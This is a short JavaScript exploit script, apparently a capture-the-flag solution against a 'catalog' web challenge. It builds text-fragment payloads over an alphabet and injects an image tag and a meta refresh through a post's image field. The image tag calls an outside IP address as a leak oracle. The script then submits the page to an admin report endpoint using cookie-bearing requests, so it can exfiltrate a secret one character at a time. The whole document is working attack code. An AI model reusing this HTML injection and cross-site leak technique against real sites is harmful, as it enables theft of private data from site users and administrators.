let alphabet = `}0123456789ABDEFGHIJKLMNOPQRSTUVWXYZ_`;
let payload = "";

for (let letter of alphabet) {
	// payload += `text=T-,F,{,-${letter}%26`;
	payload += `text=F-,{,U,-${letter}%26`;
}
payload = "#:~:" + payload.substring(0, payload.length - 3);

let image = `z"/><img src="http://106.14.153.173/fragment"><meta http-equiv="refresh" content="0;URL='http://catalog.pwni.ng/issue.php?id=3${payload}'">`;

async function main(image) {
	let token = await grecaptcha.execute(
		"6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y",
		{ action: "report" }
	);

	await fetch("http://catalog.pwni.ng/post.php", {
		credentials: "include",
		headers: {
			"content-type": "application/x-www-form-urlencoded",
		},
		body: `id=19900&title=redirect&image=${image}&content=redirect`,
		method: "POST",
		mode: "cors",
	});

	await fetch("http://catalog.pwni.ng/report.php", {
		credentials: "include",
		headers: {
			"content-type": "application/x-www-form-urlencoded",
		},
		referrer: "http://catalog.pwni.ng/issue.php?id=15563",
		body: `id=19902&token=${token}`,
		method: "POST",
		mode: "cors",
	});
}

main(image);
